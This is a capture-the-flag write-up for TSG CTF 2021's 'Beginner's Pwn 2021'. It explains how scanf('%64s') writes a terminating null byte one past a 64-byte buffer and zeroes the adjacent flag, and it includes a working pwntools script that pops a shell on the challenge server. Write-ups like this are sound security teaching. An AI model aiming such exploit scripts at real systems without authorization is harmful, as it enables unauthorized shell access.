# TSG CTF 2021 

## Beginner's Pwn 2021

> 100
> 
> I heard pwners could utilize an off-by-one error to capture the flag.
>
> `nc 34.146.50.22 30007`
>
> Hint for beginners:
> 
> * First of all, download the attachments and see the source file.
> * What you have to do is to guess the flag... No, fake the flag. That means you have to somehow make `strncmp(your_try, flag, length) == 0` hold.
> * There is little attack surface. Check the spec of suspicious functions.
>
> [`beginners_pwn.tar.gz`](beginners_pwn.tar.gz)

Tags: _pwn_ _x86-64_ _off-by-one_ _remote-shell_


## Summary

The description pretty much spells it out for you.


## Analysis

### Source Included    

```c
void win() {
    system("/bin/sh");
}

void init() {
    alarm(60);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main(void) {
    char your_try[64]={0};
    char flag[64]={0};

    init();

    puts("guess the flag!> ");

    FILE *fp = fopen("./flag", "r");
    if (fp == NULL) exit(-1);
    size_t length = fread(flag, 1, 64, fp);

    scanf("%64s", your_try);

    if (strncmp(your_try, flag, length) == 0) {
        puts("yes");
        win();
    } else {
        puts("no");
    }
    return 0;
}
```

The challenge description clearly states this is an _off-by-one error_.  Since, `scanf` is our only input method, let's start with `man scanf`:

```
s      Matches a  sequence  of  non-white-space  characters;  the  next
       pointer  must be a pointer to the initial element of a character
       array that is long enough to hold the  input  sequence  and  the
       terminating null byte ('\0'), which is added automatically.  The
       input string stops at white space or at the maximum field width,
       whichever occurs first.
```

This: _that is long enough to hold the input sequence **and the terminating null byte ('\0')**_, is the key.

`scanf("%64s", your_try);` will accept `64` characters and terminate with a null byte at the 65th character overwriting the first byte of `flag` (IFF you input 64 characters).  IOW, _off-by-one_.  So, if `flag` is null, then to match with `strncmp`, `your_try` must also be null (actually just start with null since `strncmp` compares strings and strings end with _null_).

To get a match and `win()`, just send a null followed by 63 bytes of anything.  `scanf` will append the final `null` overwriting the first byte of `flag`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

p = remote('34.146.101.4', 30007)

p.sendlineafter(b'> \n',b'\0' + 63 * b'A')
p.recvuntil(b'yes\n')
p.interactive()
```

Output:

```bash
# ./exploit.py
[+] Opening connection to 34.146.101.4 on port 30007: Done
[*] Switching to interactive mode
$ cat flag
TSGCTF{just_a_simple_off_by_one-chall_isnt_it}
```